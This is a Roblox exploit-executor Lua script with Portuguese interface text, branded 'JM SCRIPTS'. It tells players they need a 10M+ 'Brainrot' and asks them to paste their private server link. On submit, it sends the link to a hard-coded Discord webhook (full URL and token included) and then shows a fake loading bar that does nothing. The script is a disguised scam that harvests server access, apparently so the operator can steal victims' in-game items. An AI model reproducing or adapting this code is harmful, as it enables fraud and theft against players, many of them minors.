-- CONFIG
local LOAD_TIME = 15
local WEBHOOK_URL = "https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- =========================
-- WEBHOOK
-- =========================
local function sendToDiscord(text)
    local body = HttpService:JSONEncode({content = text})
    local req = syn and syn.request or http_request
    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end
end

-- =========================
-- UI BASE
-- =========================
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.Parent = game.CoreGui

local main = Instance.new("Frame", gui)
main.Size = UDim2.fromScale(1,1)
main.BackgroundColor3 = Color3.fromRGB(10,6,18)

local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 3

task.spawn(function()
    local t = 0
    while main.Parent do
        t += 0.01
        stroke.Color = Color3.fromHSV(t % 1, 1, 1)
        task.wait()
    end
end)

-- =========================
-- TÍTULO
-- =========================
local title = Instance.new("TextLabel", main)
title.Size = UDim2.fromScale(1,0.15)
title.BackgroundTransparency = 1
title.Text = "JM SCRIPTS"
title.Font = Enum.Font.GothamBlack
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(200,120,255)

-- OBRIGATÓRIO
local rule = Instance.new("TextLabel", main)
rule.Position = UDim2.fromScale(0.1,0.18)
rule.Size = UDim2.fromScale(0.8,0.07)
rule.BackgroundTransparency = 1
rule.TextScaled = true
rule.TextWrapped = true
rule.Font = Enum.Font.GothamBold
rule.TextColor3 = Color3.fromRGB(255,80,80)
rule.Text = "⚠️ OBRIGATÓRIO: tenha pelo menos 1 Brainrot de 10M+"

-- AVISO
local warnLabel = Instance.new("TextLabel", main)
warnLabel.Position = UDim2.fromScale(0.1,0.25)
warnLabel.Size = UDim2.fromScale(0.8,0.05)
warnLabel.BackgroundTransparency = 1
warnLabel.TextScaled = true
warnLabel.TextWrapped = true
warnLabel.Font = Enum.Font.Gotham
warnLabel.TextColor3 = Color3.fromRGB(180,180,180)
warnLabel.Text = "ℹ️ Aviso: o link do servidor será enviado para verificação."

-- DESCRIÇÃO
local desc = Instance.new("TextLabel", main)
desc.Position = UDim2.fromScale(0.1,0.31)
desc.Size = UDim2.fromScale(0.8,0.1)
desc.BackgroundTransparency = 1
desc.TextScaled = true
desc.TextWrapped = true
desc.Font = Enum.Font.Gotham
desc.TextColor3 = Color3.fromRGB(220,220,220)
desc.Text = "Cole o link do seu servidor privado abaixo."

-- TEXTBOX
local box = Instance.new("TextBox", main)
box.Position = UDim2.fromScale(0.15,0.43)
box.Size = UDim2.fromScale(0.7,0.1)
box.PlaceholderText = "Cole o link do servidor privado aqui"
box.TextScaled = true
box.ClearTextOnFocus = false
box.Font = Enum.Font.Gotham
box.BackgroundColor3 = Color3.fromRGB(30,18,45)
box.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", box).CornerRadius = UDim.new(0,16)

-- BOTÃO
local btn = Instance.new("TextButton", main)
btn.Position = UDim2.fromScale(0.3,0.56)
btn.Size = UDim2.fromScale(0.4,0.1)
btn.Text = "ENVIAR LINK"
btn.TextScaled = true
btn.Font = Enum.Font.GothamBold
btn.BackgroundColor3 = Color3.fromRGB(160,0,255)
btn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", btn).CornerRadius = UDim.new(0,18)

-- =========================
-- LOADING
-- =========================
local loading = Instance.new("Frame", gui)
loading.Size = UDim2.fromScale(1,1)
loading.BackgroundColor3 = Color3.fromRGB(8,5,15)
loading.Visible = false

local loadingText = Instance.new("TextLabel", loading)
loadingText.Position = UDim2.fromScale(0.1,0.4)
loadingText.Size = UDim2.fromScale(0.8,0.12)
loadingText.BackgroundTransparency = 1
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBold
loadingText.TextColor3 = Color3.fromRGB(200,140,255)
loadingText.Text = "Carregando..."

local barBg = Instance.new("Frame", loading)
barBg.Position = UDim2.fromScale(0.2,0.55)
barBg.Size = UDim2.fromScale(0.6,0.04)
barBg.BackgroundColor3 = Color3.fromRGB(40,20,60)
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,20)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(180,0,255)
Instance.new("UICorner", bar).CornerRadius = UDim.new(0,20)

-- =========================
-- CLICK
-- =========================
btn.MouseButton1Click:Connect(function()
    if box.Text == "" then
        btn.Text = "COLE O LINK ❌"
        task.wait(1)
        btn.Text = "ENVIAR LINK"
        return
    end

    sendToDiscord(box.Text)

    main.Visible = false
    loading.Visible = true

    TweenService:Create(
        bar,
        TweenInfo.new(LOAD_TIME, Enum.EasingStyle.Linear),
        {Size = UDim2.fromScale(0.95,1)}
    ):Play()
end)
